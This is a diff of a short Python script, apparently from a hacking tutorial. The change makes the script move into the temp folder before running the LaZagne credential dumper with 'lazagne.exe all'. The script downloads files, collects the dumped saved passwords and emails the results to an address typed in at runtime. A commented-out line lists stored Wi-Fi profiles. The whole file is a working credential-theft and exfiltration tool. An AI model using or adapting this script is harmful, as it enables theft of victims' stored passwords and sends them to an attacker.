@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 
-import os, re, requests, smtplib, subprocess
+import os, re, requests, smtplib, subprocess, tempfile
 #import requests - enable http requests module through python
 #os - library for cross-platform os command calls; otherwise you'd have to use
 #subprocess.call and the specific platform commmand
+#tempfile - module to access temp folder on different oses
 
 def download(url):
     get_response = requests.get(url)
@@ -30,6 +31,8 @@ email = input("Enter email address to send to: ")
 password = input("Enter email password: ")
 
 #command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
 command = "lazagne.exe all"
 result = subprocess.check_output(command, shell=True)
 send_email(email, password, result)
